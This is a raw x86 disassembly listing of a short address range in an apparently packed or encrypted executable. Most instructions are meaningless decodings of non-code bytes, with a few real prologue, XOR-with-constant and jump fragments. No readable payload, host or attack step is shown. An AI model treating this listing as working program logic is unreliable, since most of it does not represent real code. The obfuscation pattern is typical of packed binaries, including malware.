  40192f:	(bad)
  401932:	xor    edi,DWORD PTR [edi-0x17]
  401935:	mov    edi,0xd2ebe3aa
  40193a:	and    edx,ecx
  40193c:	nop
  40193d:	lock xor bl,BYTE PTR [edi+0x5b5ef520]
  401944:	xor    bh,BYTE PTR [edi-0x13]
  401947:	stc    
  401948:	jmp    0x773f:0xfa68c0cc
  40194f:	jne    0x401914
  401951:	pusha  
  401952:	mov    ah,0xce
  401954:	es call eax
  401957:	retf   0x759c
  40195a:	retf   
  40195b:	xor    edi,ebx
  40195d:	pop    esi
  40195e:	jecxz  0x4019a1
  401960:	in     eax,0x23
  401962:	add    ch,BYTE PTR [ebx+0x23bbc30f]
  401968:	hlt    
  401969:	adc    DWORD PTR [esi],0x257ad4e3
  40196f:	shl    DWORD PTR [ebx+0x5d],1
  401972:	jnp    0x401987
  401974:	fwait
  401975:	dec    ebx
  401976:	imul   ecx,DWORD PTR ds:0xc45e93b5,0xf96fcd60
  401980:	inc    edx
  401981:	mov    al,bh
  401983:	cmp    eax,0xd6a059ac
  401988:	sahf   
  401989:	and    BYTE PTR [ebp-0xbfad8c9],0x67
  401990:	and    BYTE PTR [edi+0x1a7ab70a],ch
  401996:	arpl   WORD PTR [edx+0x58a43db0],di
  40199c:	stos   DWORD PTR es:[edi],eax
  40199d:	xchg   ebx,eax
  40199e:	cdq    
  40199f:	xchg   DWORD PTR [edi+0x26],edi
  4019a2:	xchg   esp,eax
  4019a3:	retf   
  4019a4:	push   esi
  4019a5:	jg     0x40197c
  4019a7:	lock mov ebp,0xf6402f03
  4019ad:	pop    edi
  4019ae:	mov    ch,0x33
  4019b0:	ret    0x7d3d
  4019b3:	or     esi,DWORD PTR [esp+ecx*4+0x1d840f]
  4019ba:	add    BYTE PTR [eax],al
  4019bc:	mov    eax,DWORD PTR [ebp-0x10]
  4019bf:	add    DWORD PTR [eax],0x7403501
  4019c5:	jmp    0x4019d9
  4019ca:	mov    eax,DWORD PTR [ebp-0x1c]
  4019cd:	cmp    DWORD PTR [eax],0xf89f2da9
  4019d3:	jne    0x4019f4
  4019d9:	mov    eax,DWORD PTR [ebp-0x8]
  4019dc:	xor    eax,ecx
  4019de:	add    eax,esi
  4019e0:	test   eax,eax
  4019e2:	jne    0x4019f4
  4019e8:	xor    DWORD PTR [ebp-0x20],0xe149ebe
  4019ef:	jmp    0x401169
  4019f4:	pop    ebx
  4019f5:	pop    edi
  4019f6:	pop    esi
  4019f7:	leave  
  4019f8:	ret    0x4
  4019fb:	push   ebp
  4019fc:	mov    ebp,esp
  4019fe:	sub    esp,0x18
  401a01:	leave  
  401a02:	ret    0x4
  401a05:	push   ebp
  401a06:	mov    ebp,esp
  401a08:	jmp    0x401dbe
  401a0d:	addr16 es out dx,eax
  401a10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a11:	ins    DWORD PTR es:[edi],dx
  401a12:	jne    0x401a89
  401a14:	out    0xa4,al
  401a16:	cmp    ebp,DWORD PTR [ebx+0x60]
  401a19:	dec    eax
  401a1a:	mov    ch,0x1d
  401a1c:	jge    0x4019c2
  401a1e:	jnp    0x401a90
  401a20:	jo     0x4019b9
  401a22:	jge    0x401a94
  401a24:	jo     0x401a85
  401a26:	cld    
  401a27:	or     eax,DWORD PTR [ecx-0x18992948]
  401a2d:	and    dl,BYTE PTR [edx]
  401a2f:	das    
  401a30:	lock lahf 
  401a32:	shr    DWORD PTR [edx-0x37594969],cl
  401a38:	shl    ebx,0x95
  401a3b:	dec    ebx
  401a3c:	add    eax,0xf868074f
  401a41:	inc    esp
  401a42:	mov    eax,ds:0x8349864d
  401a47:	push   ebx
  401a48:	ficom  DWORD PTR [ebp-0x7b]
  401a4b:	sub    eax,0x347d2410
  401a50:	push   cs
  401a51:	sbb    al,0xc0
  401a53:	cwde   
  401a54:	repnz xchg esp,eax
  401a56:	sbb    DWORD PTR [eax],edi
  401a58:	leave  
  401a59:	and    BYTE PTR [eax-0x5],bh
  401a5c:	shr    DWORD PTR [ebx+0x41],cl
  401a5f:	xchg   BYTE PTR [edx+ebp*1],ch
  401a62:	hlt    
  401a63:	sbb    DWORD PTR [esi+0x6],esp
  401a66:	int    0x84
  401a68:	jns    0x401a1c
  401a6a:	add    al,0x36
  401a6c:	jecxz  0x401a58
  401a6e:	xchg   edi,eax
  401a6f:	pusha  
  401a70:	lods   al,BYTE PTR ds:[esi]
  401a71:	jno    0x401ad3
  401a73:	fisttp DWORD PTR [ebx]
  401a75:	mov    esi,0x31ffa13c
  401a7a:	mov    esi,0x2e71be81
  401a7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a80:	pop    ebx
  401a81:	not    BYTE PTR [ebx+eax*2+0x19]
  401a85:	nop
  401a86:	fdivr  QWORD PTR [esi+0x3b061539]
  401a8c:	xchg   ecx,eax
  401a8d:	xchg   BYTE PTR [eax-0x24],ah
  401a90:	cmp    al,0x89
  401a92:	test   eax,0xeea6acdb
  401a97:	mov    ebp,0xf3bcbb69
  401a9c:	cmp    al,0x65
  401a9e:	xor    dl,al
  401aa0:	mov    al,ds:0x10163544
  401aa5:	out    0x74,eax
  401aa7:	shl    DWORD PTR ds:0x720ec5d6,1
  401aad:	sahf   
  401aae:	push   edx
  401aaf:	push   cs
  401ab0:	cwde   
  401ab1:	into   
  401ab2:	add    eax,esi
  401ab4:	push   cs
  401ab5:	es cmp al,0x5f
  401ab8:	dec    eax
  401ab9:	dec    DWORD PTR [esi]
  401abb:	sbb    ebx,DWORD PTR [esi+0x5e]
  401abe:	xchg   ecx,eax
  401abf:	pop    esi
  401ac0:	add    DWORD PTR [ebp+0x28d3afcf],eax
  401ac6:	fidivr WORD PTR [esi+0x21abaa04]
  401acc:	ret    
  401acd:	cmp    BYTE PTR [ebx+esi*8+0x20],bh
  401ad1:	cmc    
  401ad2:	jno    0x401b44
  401ad4:	int3   
  401ad5:	test   BYTE PTR [esi+0x57aa820],dl
  401adb:	xchg   BYTE PTR [edi+0x156da8fd],al
  401ae1:	push   ecx
  401ae2:	stc    
  401ae3:	aas    
  401ae4:	jp     0x401b3d
  401ae6:	cmp    eax,0x2d5af901
  401aeb:	shl    DWORD PTR [edx+esi*1+0x59f05330],cl
  401af2:	mov    bh,0x65
  401af4:	jmp    0x401b68
  401af6:	inc    ecx
  401af7:	pop    esi
  401af8:	or     dh,cl
  401afa:	pop    edi
  401afb:	stos   DWORD PTR es:[edi],eax
  401afc:	jno    0x401b1f
  401afe:	(bad)  
  401aff:	(bad)  
  401b00:	enter  0xb62e,0x6c
  401b04:	je     0x401a94
  401b06:	adc    al,0x17
  401b08:	pop    edi
  401b09:	pop    ss
  401b0a:	ret    
  401b0b:	cs push esi
  401b0d:	or     DWORD PTR [edx],0x21debbcf
  401b13:	adc    DWORD PTR [ebx-0x58],0xffffffb0
  401b17:	and    dh,0xb8
  401b1a:	inc    edi
  401b1b:	sub    ebp,0x18
  401b1e:	punpckhbw mm3,QWORD PTR [ebx+0x2190f006]
  401b25:	mov    edx,esp
  401b27:	jmp    0x8a4b:0x7a2d3f27
  401b2e:	out    0x44,eax
  401b30:	out    dx,al
  401b31:	mov    esp,0x98cb143c
  401b36:	mov    ecx,0x1f243550
  401b3b:	pop    esp
  401b3c:	jmp    0x401b4f
  401b3e:	test   BYTE PTR ss:0x80838b3e,al
  401b45:	(bad)  
  401b47:	test   al,0xa2
  401b49:	cmp    eax,DWORD PTR [ecx+esi*8+0x14c15d4d]
  401b50:	inc    edx
  401b51:	mov    bl,0x1c
  401b53:	sbb    DWORD PTR ds:0xcb1d6a4d,edi
  401b59:	mov    esp,?
  401b5b:	ja     0x401bd0
  401b5d:	outs   dx,BYTE PTR ds:[esi]
  401b5e:	lds    esp,FWORD PTR [ecx]
  401b60:	outs   dx,DWORD PTR ds:[esi]
  401b61:	mov    DWORD PTR [eax+ebp*2-0x5e16ddb4],edi
  401b68:	mov    bh,0x75
  401b6a:	rol    DWORD PTR [ebx-0x6f3c9a53],0xed
  401b71:	inc    ebp
  401b72:	stc    
  401b73:	inc    esp
  401b74:	cdq    
  401b75:	popa   
  401b76:	cs sar edi,1
  401b79:	aam    0x7d
  401b7b:	adc    edx,ecx
  401b7d:	jne    0x401b5f
  401b7f:	lea    ecx,[edx]
  401b81:	sub    dl,bh
  401b83:	popf   
  401b84:	push   0x4ed9927e
  401b89:	jns    0x401bbe
  401b8b:	xor    esi,edi
  401b8d:	cmp    eax,0xb6a323b8
  401b92:	dec    ebp
  401b93:	mov    esi,0x8de8fca
  401b98:	jns    0x401b99
  401b9a:	mov    ecx,eax
  401b9c:	mov    eax,ds:0x5069371
  401ba1:	xchg   edx,eax
  401ba2:	sub    al,0x8b
  401ba4:	repnz push edi
  401ba6:	xor    bl,BYTE PTR [edx-0x706664d2]
  401bac:	dec    edx
  401bad:	xchg   BYTE PTR [esp+esi*8-0x3b9e54d1],bh
  401bb4:	jle    0x401c11
  401bb6:	scas   eax,DWORD PTR es:[edi]
  401bb7:	adc    al,0x93
  401bb9:	and    al,0x56
  401bbb:	add    eax,0x2c89a794
  401bc0:	xchg   ebp,eax
  401bc1:	rcr    BYTE PTR [ebx-0x62],cl
  401bc4:	ret    0x2e2
  401bc7:	pop    ss
  401bc8:	inc    ecx
  401bc9:	xchg   ebx,eax
  401bca:	mov    esp,0x8e924833
  401bcf:	mov    ch,0x8
  401bd1:	inc    ebx
  401bd2:	enter  0x53b3,0x6c
  401bd6:	dec    eax
  401bd7:	cmp    bl,BYTE PTR es:[edi+0x10]
  401bdb:	and    al,BYTE PTR [ecx+0x2ac4afd7]
  401be1:	pop    esi
  401be2:	xchg   esi,eax
  401be3:	cdq    
  401be4:	ds mov ebx,0xf19f821d
  401bea:	add    al,0x9d
  401bec:	imul   eax,ebp,0xffffff92
  401bef:	and    eax,0xe8698b5b
  401bf4:	pop    esi
  401bf5:	fisttp WORD PTR [ecx]
  401bf7:	xor    dh,ah
  401bf9:	scas   al,BYTE PTR es:[edi]
  401bfa:	mov    edi,0x37ddd040
  401bff:	retf   0xac92
  401c02:	or     al,0x1b
  401c04:	mov    cl,cl
  401c06:	inc    eax
  401c07:	inc    ebp
  401c08:	dec    esi
  401c09:	xchg   BYTE PTR [esp+ebp*8],ch
  401c0c:	adc    ch,BYTE PTR [ebp+edx*8-0x51c509ec]
  401c13:	inc    ebp
  401c14:	ret    
  401c15:	loope  0x401c7c
  401c17:	into   
  401c18:	into   
  401c19:	shr    BYTE PTR [edx],0xfe
  401c1c:	bound  ebp,QWORD PTR [ebx+0x19f9df94]
  401c22:	rcl    BYTE PTR es:[eax-0x61],cl
  401c26:	dec    edi
  401c27:	mov    dl,0x8e
  401c29:	loopne 0x401bc5
  401c2b:	mov    ds:0x871d77c5,al
  401c30:	jg     0x401c01
  401c32:	jg     0x401bdf
  401c34:	jmp    FWORD PTR [ebx]
  401c36:	icebp  
  401c37:	xchg   ecx,eax
  401c38:	jb     0x401c79
  401c3a:	or     dl,BYTE PTR [edx]
  401c3c:	stos   DWORD PTR es:[edi],eax
  401c3d:	and    al,0x33
  401c3f:	and    eax,0xf3cd7526
  401c44:	jo     0x401cc2
  401c46:	xchg   edi,eax
  401c47:	push   ebx
  401c48:	add    esi,eax
  401c4a:	dec    ecx
  401c4b:	push   0x45
  401c4d:	jle    0x401c41
  401c4f:	cmp    DWORD PTR [esi],0x3
  401c52:	outs   dx,DWORD PTR ds:[esi]
  401c53:	inc    ch
  401c55:	xor    al,0x6a
  401c57:	add    eax,0x37145a47
  401c5c:	or     DWORD PTR [ecx+0x3d],0x77
  401c60:	shr    DWORD PTR [ebp+0x717f4b59],0xee
  401c67:	push   esi
  401c68:	inc    ecx
  401c69:	jbe    0x401c3a
  401c6b:	fs addr16 dec esi
  401c6e:	loop   0x401c94
  401c70:	adc    al,BYTE PTR [edx]
  401c72:	and    bh,bl
  401c74:	xchg   DWORD PTR [eax-0x4b41c4af],edx
  401c7a:	lea    esi,[ecx*2-0x17bfcfa0]
  401c81:	out    dx,al
  401c82:	repnz mov BYTE PTR [edx],bl
  401c85:	xchg   ebx,eax
  401c86:	mov    bl,0x70
  401c88:	test   BYTE PTR [esi],0x45
  401c8b:	imul   eax,DWORD PTR [ebx+0x7d5c6276],0xffffffd8
  401c92:	in     eax,dx
  401c93:	push   eax
  401c94:	mov    bl,0xeb
  401c96:	and    DWORD PTR [ebx],esp
  401c98:	mov    ds:0xefb2bd89,al
  401c9d:	mov    bh,0x61
  401c9f:	lods   al,BYTE PTR ds:[esi]
  401ca0:	inc    edx
  401ca1:	test   eax,0xc2bcaea0
  401ca6:	jne    0x401c3f
  401ca8:	mov    BYTE PTR [ebx+0x5e],dl
  401cab:	int    0x5e
  401cad:	loopne 0x401ce8
  401caf:	out    0x8a,eax
  401cb1:	xchg   ecx,eax
  401cb2:	pop    eax
  401cb3:	and    eax,0x1de69580
  401cb8:	arpl   sp,dx
  401cba:	ret    0x5054
  401cbd:	mov    ebx,0x672226ca
  401cc2:	mov    edi,0x2a15495
  401cc7:	dec    esi
  401cc8:	fisub  WORD PTR [ebp+0x4aa345d0]
  401cce:	xor    dh,BYTE PTR [eax+0x2e]
  401cd1:	retf   
  401cd2:	pop    ds
  401cd3:	call   0x4b1d:0xba09ea47
  401cda:	cmp    BYTE PTR [edx+0x5536b74c],cl
  401ce0:	(bad)  
  401ce1:	rol    DWORD PTR ds:0xd5a92284,cl
  401ce7:	xchg   ebx,eax
  401ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ce9:	jne    0x401d41
  401ceb:	les    esp,FWORD PTR [eax+0x1092b4d6]
  401cf1:	lds    ebp,FWORD PTR [edx-0x71]
  401cf4:	or     DWORD PTR [ebx-0x42],ebx
  401cf7:	test   BYTE PTR [edx-0x38],al
  401cfa:	xchg   esp,eax
  401cfb:	js     0x401cf5
  401cfd:	lds    ebx,FWORD PTR [edi-0x51]
  401d00:	jne    0x401d20
  401d02:	jne    0x401cd0
  401d04:	cmc    
  401d05:	loope  0x401d64
  401d07:	push   0x2e
  401d09:	iret   
  401d0a:	mov    esp,0x3987cd86
  401d0f:	or     al,0x36
  401d11:	stos   DWORD PTR es:[edi],eax
  401d12:	test   eax,0x348fcbbf
  401d17:	fs jne 0x401d4a
  401d1a:	ffreep st(6)
  401d1c:	int3   
  401d1d:	dec    edx
  401d1e:	and    bl,dl
  401d20:	stos   BYTE PTR es:[edi],al
  401d21:	inc    eax
  401d22:	add    dh,BYTE PTR [eax]
  401d24:	ds inc ecx
  401d26:	aad    0xb1
  401d28:	and    BYTE PTR [ebx-0x649e00f8],dl
  401d2e:	loop   0x401d48
  401d30:	repnz push edx
  401d32:	in     al,dx
  401d33:	lahf   
  401d34:	pop    edx
  401d35:	lods   al,BYTE PTR ds:[esi]
  401d36:	gs in  al,0xbc
  401d39:	jmp    0x401d59
  401d3b:	pop    esi
  401d3c:	or     eax,0x6ed6dbbc
  401d41:	mov    ebp,0xb3888ded
  401d46:	or     DWORD PTR [eax+0x45],0x72d02b8d
  401d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d4e:	mov    al,ds:0x2bcf7a6e
  401d53:	mov    ebp,DWORD PTR [esi+0x3a]
  401d56:	mov    dl,0x8f
  401d58:	fmul   DWORD PTR [ebp+0x6791280f]
  401d5e:	xor    bl,BYTE PTR [ecx]
  401d60:	into   
  401d61:	xchg   bl,ch
  401d63:	pop    es
  401d64:	arpl   bp,di
  401d66:	ret    0xa37a
  401d69:	push   edi
  401d6a:	push   ecx
  401d6b:	aam    0x91
  401d6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d6e:	xor    eax,DWORD PTR [eax]
  401d70:	popa   
  401d71:	push   ds
  401d72:	dec    ebp
  401d73:	pop    ecx
  401d74:	mov    WORD PTR [ecx],cs
  401d76:	xor    eax,0x52cb3083
  401d7b:	xchg   edi,eax
  401d7c:	push   0x2ee2606
  401d81:	mov    ah,bh
  401d83:	loop   0x401dd0
  401d85:	xchg   DWORD PTR [ebp+0x1cc431f4],ecx
  401d8b:	dec    ebp
  401d8c:	sub    eax,0xfad368eb
  401d91:	idiv   BYTE PTR [ebx-0x7f]
  401d94:	add    ecx,esp
  401d96:	sub    BYTE PTR [eax+ebx*2-0x4441dfcb],dl
  401d9d:	ss enter 0xa780,0xe9
  401da2:	cmp    BYTE PTR [edx-0x3d6d50ea],cl
  401da8:	mov    sp,?
  401dab:	test   al,al
  401dad:	pusha  
  401dae:	popf   
  401daf:	fild   DWORD PTR [edi-0x54baf53d]
  401db5:	xor    DWORD PTR [ebx-0x402d83cd],eax
  401dbb:	cmp    ah,dl
  401dbd:	add    edx,DWORD PTR [ecx+0x51]
  401dc0:	xor    DWORD PTR ds:0x434366,ebx
  401dc6:	mov    eax,0xf89c8531
  401dcb:	sub    DWORD PTR ds:0x432dde,ebx
  401dd1:	mov    DWORD PTR [ebp-0x8],eax
  401dd4:	sbb    DWORD PTR ds:0x432dce,0x43436e
  401dde:	jmp    0x402194
  401de3:	add    ebx,DWORD PTR [ebx-0x2398ef41]
  401de9:	arpl   WORD PTR [ebx-0x6e9fb147],sp
  401def:	cmp    DWORD PTR [ebp+0x73b4ed3],esp
  401df5:	jo     0x401e67
  401df7:	xchg   edi,eax
  401df8:	jge    0x401e6a
  401dfa:	jo     0x401dbc
  401dfc:	repnz mov edx,0x98ff315
  401e02:	add    DWORD PTR [esi+ebx*4],edi
  401e05:	xor    al,0xc4
  401e07:	sbb    DWORD PTR ds:0x25c4f803,ebx
  401e0d:	xchg   ebp,eax
  401e0e:	lock adc al,0x86
  401e11:	add    eax,0xc73863cc
  401e16:	or     BYTE PTR [edx],cl
  401e18:	daa    
  401e19:	jo     0x401e2d
  401e1b:	xor    edi,esp
  401e1d:	data16 mov bh,0x34
  401e20:	dec    edx
  401e21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e22:	dec    ebp
  401e23:	pop    ss
  401e24:	ficomp WORD PTR [edi+0x39]
  401e27:	clc    
  401e28:	and    dl,BYTE PTR [edx-0x55ab90e5]
  401e2e:	xchg   esp,eax
  401e2f:	xor    eax,0x38b43c2b
  401e34:	jne    0x401e94
  401e36:	jmp    0x401e0e
  401e38:	jo     0x401eb3
  401e3a:	xor    DWORD PTR [esi+0x1c],edx
  401e3d:	inc    edx
  401e3e:	xor    BYTE PTR [ecx],dl
  401e40:	push   cs
  401e41:	mov    cl,0xd8
  401e43:	clts   
  401e45:	xchg   esp,eax
  401e46:	add    edi,DWORD PTR [edi+0x6e]
  401e49:	or     BYTE PTR [edx+0x3f],dh
  401e4c:	and    BYTE PTR [ecx+eax*4],dl
  401e4f:	sub    eax,0x3103f041
  401e54:	jb     0x401e11
  401e56:	mov    eax,DWORD PTR [ecx]
  401e58:	mov    edi,0x56bf5f1b
  401e5d:	call   0xda9c:0x5f84118c
  401e64:	nop
  401e65:	mov    ecx,0x3487755f
  401e6a:	jp     0x401e35
  401e6c:	pop    ebx
  401e6d:	shl    DWORD PTR [edx-0x5793bb22],cl
  401e73:	mov    ebp,0x523d2a0a
  401e78:	std    
  401e79:	dec    ebp
  401e7a:	outs   dx,BYTE PTR ds:[esi]
  401e7b:	adc    esp,0x5f21da6b
  401e81:	xchg   esp,eax
  401e82:	xchg   ebp,eax
  401e83:	popa   
  401e84:	ins    DWORD PTR es:[edi],dx
  401e85:	inc    ebx
  401e87:	push   edx
  401e88:	pushf  
  401e89:	xchg   ecx,eax
  401e8a:	(bad)  
  401e8b:	(bad)  ds:0xfd795bb
  401e91:	lods   al,BYTE PTR ds:[esi]
  401e92:	xor    edx,DWORD PTR [edi+0x27eb65cb]
  401e98:	mov    dl,0xe1
  401e9a:	fst    DWORD PTR [edx]
  401e9c:	(bad)  
  401e9d:	in     al,0x3e
  401e9f:	mov    ecx,0x1b58af23
  401ea4:	lods   eax,DWORD PTR ds:[esi]
  401ea5:	push   eax
  401ea6:	pop    eax
  401ea7:	pop    ebp
  401ea8:	and    DWORD PTR [esi-0x1],edi
  401eab:	xchg   DWORD PTR [ebx+0x74cb040e],esi
  401eb1:	mov    edx,0x2be1de4e
  401eb6:	js     0x401ee5
  401eb8:	(bad)
  401ebb:	loopne 0x401e3f
  401ebd:	cmp    DWORD PTR [ecx+ebp*4-0x55],eax
  401ec1:	(bad)  
  401ec2:	or     ecx,DWORD PTR [edi+0x9]
  401ec5:	cmp    DWORD PTR [esi],ecx
  401ec7:	out    0x96,eax
  401ec9:	icebp  
  401eca:	or     eax,0xda79ea6b
  401ecf:	(bad)  
  401ed0:	out    dx,al
  401ed1:	aas    
  401ed2:	sbb    al,0x7e
  401ed4:	js     0x401e82
  401ed6:	add    DWORD PTR [ebx-0x2fca3dfe],eax
  401edc:	fcmovnu st,st(1)
  401ede:	repnz xchg edi,eax
  401ee0:	push   cs
  401ee1:	int    0xd7
  401ee3:	sbb    DWORD PTR [ebx+edi*2],ebp
  401ee6:	ss pop esi
  401ee8:	in     eax,dx
  401ee9:	std    
  401eea:	mov    bh,0x7d
  401eec:	ror    DWORD PTR [edi+0x23],1
  401eef:	and    eax,0x6f3fc658
  401ef4:	iret   
  401ef5:	mov    ecx,0x6aa15cff
  401efa:	mov    ah,0x69
  401efc:	hlt    
  401efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401efe:	sub    eax,0xba1d7b2b
  401f03:	inc    ecx
  401f04:	mov    ah,BYTE PTR [edi+0x14]
  401f07:	jp     0x401f79
  401f09:	adc    al,BYTE PTR [esi]
  401f0b:	mov    DWORD PTR [edx],0xa5f3d00a
  401f11:	jmp    0x401f1e
  401f13:	into   
  401f14:	fist   WORD PTR [edx-0x4b]
  401f17:	push   0xffffffe2
  401f19:	inc    esp
  401f1a:	mov    bh,BYTE PTR [edi]
  401f1c:	mov    ds:0x551b3221,al
  401f21:	fiadd  WORD PTR [ebx+0x72]
  401f24:	mov    dl,BYTE PTR ds:0xf20588eb
  401f2a:	es pop eax
  401f2c:	pop    ss
  401f2d:	sbb    dl,bl
  401f2f:	jo     0x401f43
  401f31:	fisubr WORD PTR [edi]
  401f33:	les    edx,FWORD PTR [esi+0x4f7d7825]
  401f39:	icebp  
  401f3a:	aas    
  401f3b:	adc    al,0xba
  401f3d:	push   ecx
  401f3e:	jmp    0x5605:0x85d675fd
  401f45:	arpl   bp,bx
  401f47:	das    
  401f48:	inc    ecx
  401f49:	shl    DWORD PTR [ecx-0x27],cl
  401f4c:	cdq    
  401f4d:	mov    eax,ds:0x4753fd87
  401f52:	shl    DWORD PTR [edi+0x26],cl
  401f55:	xchg   esi,eax
  401f56:	inc    ecx
  401f57:	je     0x401fa7
  401f59:	fidivr WORD PTR [esi-0x29]
  401f5c:	into   
  401f5d:	out    0xfc,al
  401f5f:	adc    DWORD PTR [ebx+0x26],0x8ca7e86
  401f66:	stc    
  401f67:	push   cs
  401f68:	sbb    eax,0xd6ddafc1
  401f6d:	or     al,0x14
  401f6f:	pop    ecx
  401f70:	jge    0x401f58
  401f72:	cdq    
  401f73:	xchg   ebx,eax
  401f74:	arpl   WORD PTR [esi+0x1b],cx
  401f77:	and    dh,BYTE PTR [ebp-0x2d]
  401f7a:	and    eax,0x2cbea412
  401f7f:	sbb    bl,BYTE PTR ds:0xac97b4b4
  401f85:	std    
  401f86:	push   ebp
  401f87:	and    BYTE PTR [edx+0x47de0475],0x6c
  401f8e:	in     eax,dx
  401f8f:	cmp    eax,0x3a097296
  401f94:	jge    0x401f4d
  401f96:	ret    
  401f97:	mov    dl,0xc6
  401f99:	mov    dh,0x4d
  401f9b:	test   DWORD PTR [esi-0x27],edi
  401f9e:	inc    edi
  401f9f:	mov    ds:0x42e35ea9,eax
  401fa4:	stos   DWORD PTR es:[edi],eax
  401fa5:	mov    edx,0x7801b918
  401faa:	sahf   
  401fab:	push   0x8ca3f805
  401fb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401fb1:	out    dx,eax
  401fb2:	cdq    
  401fb3:	test   al,0x5d
  401fb5:	xor    ch,BYTE PTR [edx+0x39]
  401fb8:	(bad)  
  401fb9:	loope  0x401fa3
  401fbb:	add    DWORD PTR [ecx+eiz*2-0x4b4b7f],edx
  401fc2:	dec    esi
  401fc3:	ins    BYTE PTR es:[edi],dx
  401fc4:	fistp  DWORD PTR [esp+eax*1-0x6defce9a]
  401fcb:	sahf   
  401fcc:	fs and eax,0x2972f9ad
  401fd2:	push   ebp
  401fd3:	int    0x71
  401fd5:	add    al,0xf8
  401fd7:	ret    0xeb0a
  401fda:	mov    esi,ebx
  401fdc:	(bad)
  401fdf:	jbe    0x402028
  401fe1:	fwait
  401fe2:	mov    ds,WORD PTR [ebx]
  401fe4:	cmp    dl,0xae
  401fe7:	mov    ds:0xa62cbb18,eax
  401fec:	cdq    
  401fed:	fidiv  WORD PTR [ebx-0x4de9f2d4]
  401ff3:	xlat   BYTE PTR ds:[ebx]
  401ff4:	inc    eax
  401ff5:	dec    ebx
  401ff6:	xchg   ebp,eax
  401ff7:	mov    ds:0x58cdd99c,eax
  401ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ffd:	jo     0x401ff1
  401fff:	sub    al,0xca
  402001:	add    BYTE PTR [eax+0x6f7cc10e],0xcb
  402008:	sub    ebp,DWORD PTR [edi]
  40200a:	daa    
  40200b:	inc    edx
  40200c:	sub    DWORD PTR [esi+0x40],ebx
  40200f:	or     eax,0x61ceb965
  402014:	add    al,0x36
  402016:	in     al,0x31
  402018:	test   BYTE PTR [ebp-0x45],cl
  40201b:	rcl    BYTE PTR [ecx],0xdd
  40201e:	addr16 mov ebp,0xba3e4822
  402024:	jns    0x402039
  402026:	pop    ds
  402027:	sub    edx,DWORD PTR [edi]
  402029:	pop    ecx
  40202a:	pop    ecx
  40202b:	xor    al,0x8e
  40202d:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40202f:	dec    esp
  402030:	bound  ebp,QWORD PTR [ebp+0x68b327f4]
  402036:	es and al,BYTE PTR gs:[eax+0x4907a7d2]
  40203e:	push   0xfc02083c
  402043:	lds    edi,FWORD PTR [edx-0x78605e90]
  402049:	inc    ecx
  40204a:	sti    
  40204b:	xor    edi,DWORD PTR [esi-0x16bb5a43]
  402051:	xchg   edx,eax
  402052:	(bad)  
  402054:	rcl    DWORD PTR [edi+0x40],0x27
  402058:	push   esi
  402059:	mov    eax,0x82b7509d
  40205e:	and    edi,esp
  402060:	jecxz  0x40208c
  402062:	add    eax,0x1ed5b166
  402067:	jl     0x40200e
  402069:	dec    esi
  40206a:	cmp    edx,DWORD PTR [ebp+0x15]
  40206d:	sbb    al,0x7
  40206f:	aaa    
  402070:	cs push ecx
  402072:	(bad)  
  402073:	and    esp,DWORD PTR [eax+0x5d41b4d4]
  402079:	inc    esi
  40207a:	push   ecx
  40207b:	dec    edi
  40207c:	neg    DWORD PTR [edx-0x39]
  40207f:	jecxz  0x4020ba
  402081:	lahf   
  402082:	add    edx,ebx
  402084:	test   BYTE PTR [ecx+0x6f],ah
  402087:	mov    bl,dh
  402089:	sbb    DWORD PTR [ebx],ebx
  40208b:	gs cdq 
  40208d:	add    eax,0x82a88c91
  402092:	loop   0x402023
  402094:	inc    ebp
  402095:	inc    ebx
  402096:	jnp    0x402058
  402098:	sbb    DWORD PTR [ebx-0x7a7a0f6b],ecx
  40209e:	iret   
  40209f:	xchg   edx,eax
  4020a0:	sbb    BYTE PTR [eax-0x34],0x71
  4020a4:	pop    eax
  4020a5:	pop    esi
  4020a6:	nop
  4020a7:	out    dx,eax
  4020a8:	(bad)  
  4020a9:	aam    0x92
  4020ab:	pop    ecx
  4020ac:	cmp    al,0x7d
  4020ae:	(bad)  
  4020af:	rol    ecx,cl
  4020b1:	das    
  4020b2:	(bad)  
  4020b3:	jbe    0x40205a
  4020b5:	mov    dl,0x5e
  4020b7:	in     al,dx
  4020b8:	pop    edx
  4020b9:	fcom   st(3)
  4020bb:	test   DWORD PTR [edx-0x13],0x18f37e96
  4020c2:	arpl   WORD PTR [esi],di
  4020c4:	mov    al,ds:0xe194d9a4
  4020c9:	das    
  4020ca:	adc    BYTE PTR [edi-0x64],bh
  4020cd:	ror    esi,0x9
  4020d0:	imul   edi,DWORD PTR [edi],0xea0705af
  4020d6:	jge    0x40207b
  4020d8:	push   ecx
  4020d9:	mov    ds:0x79f0e7c9,al
  4020de:	xchg   DWORD PTR [edx+0x70098d89],esp
  4020e4:	mov    ebx,0xf0679573
  4020e9:	lods   eax,DWORD PTR ds:[esi]
  4020ea:	inc    edx
  4020eb:	les    ebp,FWORD PTR ds:0x8f8f409e
  4020f1:	xlat   BYTE PTR ds:[ebx]
  4020f2:	sahf   
  4020f3:	mov    al,ds:0x947a9407
  4020f8:	lds    ecx,FWORD PTR [eax-0x853072f]
  4020fe:	into   
  4020ff:	out    dx,eax
  402100:	lds    edx,FWORD PTR [eax]
  402102:	push   ecx
  402103:	adc    BYTE PTR [edx],ch
  402105:	jnp    0x40212e
  402107:	add    esi,ebx
  402109:	sub    BYTE PTR [esi+0x15c95924],0x6e
  402110:	scas   eax,DWORD PTR es:[edi]
  402111:	xor    edi,0x36
  402114:	nop
  402115:	shl    DWORD PTR [edi],1
  402117:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402118:	sbb    dl,ah
  40211a:	or     esp,DWORD PTR ds:0x33f5785d
  402120:	and    al,0x48
  402122:	ins    DWORD PTR es:[edi],dx
  402123:	enter  0x546b,0x69
  402127:	mov    ah,0x5e
  402129:	sbb    al,0x97
  40212b:	popa   
  40212c:	pop    esp
  40212d:	std    
  40212e:	lock add al,0xfd
  402131:	and    al,bl
  402133:	inc    ebx
  402134:	int3   
